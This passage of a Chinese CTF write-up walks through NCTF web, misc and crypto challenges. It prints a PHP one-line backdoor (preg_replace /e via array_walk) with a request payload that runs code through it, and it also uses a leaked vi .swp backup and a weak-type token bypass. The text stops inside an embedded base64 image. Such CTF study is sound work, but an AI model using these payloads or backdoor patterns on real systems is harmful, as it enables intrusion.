$cut=strchr($file,"loginxlcteam");
if($cut==false){
$data=file_get_contents($file);
$date=htmlspecialchars($data);
echo $date;
}else{
echo "<script>alert('敏感目录，禁止查看！但是。。。')</script>";
}
}
```

嘿嘿，惊喜来了！！！

`loginxlcteam`，看到了这个，还说是敏感目录，好了，应该就是它了

尝试去访问`http://cms.nuptzj.cn/loginxlcteam/conpass.php`，使用之前获得`admin`和`fuckruntu`成功登录后台

返回

```
恭喜你已拿下后台，离爆菊只差一步了flag1:nctf{}
因为程序猿连后台都懒得开发了，为了方便管理，他邪恶地放了一个一句话木马在网站的根目录下
小马的文件名为：xlcteam.php
```

说明我们离flag不远了，而且我们又获得了一个重要信息`xlcteam.php`，还是个一句话木马，岂不是可以命令执行了～

读一下

**xlcteam.php**

```Php
<?php
$e = $_REQUEST['www'];
$arr = array($_POST['wtf'] => '|.*|e',);
array_walk($arr, $e, '');
?>
```

这种一句话的利用方式就是让`www=preg_replace`，然后`wtf`参数传入可执行语句

paylaod

```
http://cms.nuptzj.cn/xlcteam.php?www=preg_replace
post: wtf=phpinfo();
```

![](https://ws1.sinaimg.cn/large/006Vib6xly1frlagsjny8j30w20kun0h.jpg)

成功执行

然后利用`phpinfo()`的信息，我们可以看到禁用函数，发现一些常见的命令执行函数都被禁了

但是我们还是有办法的

`wtf=print_r(scandir('./'))；`

执行得到

```
Array ( [0] => . [1] => .. [2] => about.php [3] => antiinject.php [4] => antixss.php [5] => config.php [6] => index.php [7] => list.php [8] => loginxlcteam [9] => passencode.php [10] => preview.php [11] => say.php [12] => sm.txt [13] => so.php [14] => xlcteam.php [15] => 恭喜你获得flag2.txt ) 
```

这里我又踩了一个坑，我一开始一直以为文件名叫`flag2.txt`，发现怎么都读不到，怎么访问都是404，于是我又仔细看了一下，才反应过来文件名是叫`恭喜你获得flag2.txt`

直击访问得到`flag:nctf{you_are_s0_g00d_hacker}`

### 重置密码2

**题干**

```
题题被秒，当时我就不乐意了！
本题来源于CUMT

TIPS:
1.管理员邮箱观察一下就可以找到
2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
3.弱类型bypass
```

**题解**

查看源代码看到管理员邮箱`admin@nuptzj.cn`，和`submit.php`

根据提示`vi编辑器和备份文件`，应该是`swp`备份文件泄露，尝试访问`.submit.php.swp`，成功获取源码和表结构

```php

........这一行是省略的代码........

/*
如果登录邮箱地址不是管理员则 die()
数据库结构

--
-- 表的结构 `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `token` int(255) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `user`
--

INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES
(1, '****不可见***', '***不可见***', 0);
*/


........这一行是省略的代码........

if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```

根据要求需要让`token`的长度为10，并且值等于0

尝试`emailAddress=admin@nuptzj.cn&token=0000000000`

成功获得flag：`flag:nctf{thanks_to_cumt_bxs}`

## Misc

### 图种

**题干**

```
flag是动态图最后一句话的拼音首字母
加上nctf{}
```

**题解**

扔进binwalk，发现一个zip

foremost分离一下，得到zip，解压是另一张gif图片

翻到最后一张，最后一句话是：`都深深的出卖了我`

所以flag是`nctf{dssdcmlw}`

### 丘比龙De女神

**题干**

```
丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！

没错 里面隐藏了一张女神的照片
flag是照片文件的md5值(小写)
记住加上flag{}
```

**题解**

先扔进`binwalk`看一下

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             GIF image data, version "87a", 100 x 100
115088        0x1C190         End of Zip archive
```

发现一个zip结尾，但并没有发现开头

我们首先是要找到gif的结尾，将zip部分分离出来

我们找到`3B`，将前面删除后，观察一下，发现有个`love`字样，而我们知道正常的`zip`开头是`PK`

我们将最前面的`00`也删除，同时，将`6C6F7665`改为常见的zip头`504B0304`

改一下文件名后缀为`zip`，成功打开，并且有加密，猜测密码是刚才那个`love`

成功解压。获得一张`nvshen.jpg`

计算一下它的`md5`值为`A6CAAD3AAAFA11B6D5ED583BEF4D8A54`

所以flag就是`flag{A6CAAD3AAAFA11B6D5ED583BEF4D8A54}`

## 密码学

### easy!

**题干**

```
密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9
这题做不出来就剁手吧！
```

**题解**

base64解码，得到`nctf{this_is_base64_encode}`

### KeyBoard!

**题干**

```
看键盘看键盘看键盘！
答案非标准格式，提交前加上nctf{}
ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm
```

**题解**

提示看键盘

我们发现每一小段按顺序走一遍都是一个字母

```
ytfvbhn ------ a
tgbgy -------- r
hjuygbn ------ e
yhnmki ------- u
tgvhn -------- h
uygbnjm ------ a
uygbn -------- c
yhnijm ------- k
```

该根据格式，得到flag：`nctf{areuhack}`

### base64全家桶

**题干**

```
全家桶全家桶全家桶！
我怎么饿了。。。。。。
密文(解密前删除回车)：R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES
1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk
zREVOUlJHNFpUTU5KVEdFWlRNTjJF
```

**题解**

```
R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVkzREVOUlJHNFpUTU5KVEdFWlRNTjJF
```

先base64解码，得到

```
GZCTMMZXGQ3DMN2CGYZDMMJXGM3DKMZWGM2DKRRWGI3DCNZTGY2TGMZTGI2UMNRRGZCTMNBVIY3DENRRG4ZTMNJTGEZTMN2E
```

再base32解码，得到

```
6E6374667B6261736536345F6261736533325F616E645F6261736531367D
```

最后base16解码，得到

```
nctf{base64_base32_and_base16}
```

或者我们可以拿脚本跑一下

```python
import random
from base64 import *
f = open("base64_string.txt", "r")
f2 = open("flag.txt", "w")
# f1 = open("str.txt","w")
str = ""
if f:
    while True:
        line = f.readline()
        if line:
            line = line[:-1]
            str += line
        else:
            break
result={
    '16':lambda x:b16decode(x),
    '32':lambda x:b32decode(x),
    '64':lambda x:b64decode(x),
}
while True:
    try:
        str=result['16'](str)
        continue
    except:
        pass
    try:
        str=result['32'](str)
        continue
    except:
        pass
    try:
        str=result['64'](str)
        continue
    except:
        pass
    break
print str
f2.write(str)
```

也可以得到相同结果

### n次base64

**题干**

```
依然是base64
不过。。。编码次数有点多
请用python解吧~
```

**题解**

运行上一题脚本

得到`flag:nctf{please_use_python_to_decode_base64}`

### 骚年来一发吗

**题干**

`密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas`

加密代码：

```php
function encode($str)
{
  $_o = strrev($str);
  for($_0 = 0; $_0 < strlen($_o); $_0++)
  {
    $_c = substr($_o, $_0, 1);
    $__ = ord($_c) + 1;
    $_c = chr($__);
    $_ = $_.$_c;
  }
  return str_rot13(strrev(base64_encode($_)));
}
```

**题解**

我们来写个解密脚本

```php
<?php
function decode($str)
{
    $str = base64_decode((strrev(str_rot13($str))));
    $_o = strrev($str);
    for($_0=0;$_0<strlen($_o);$_0++)
    {
        $_c = substr($_o,$_0,1);
        $__ = ord($_c) - 1;
        $_c = chr($__);
        $_ = $_.$_c;
    }
    return $_;
}

$str = 'iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas';
echo decode($str);
```

运行一下得到`nctf{rot13_and_base64_and_strrev}`

### mixed_base64

**题干**

```
多重base64加密，
干(sang)得(xin)漂(bing)亮(kuang)!
```

![](data:image/png;base64,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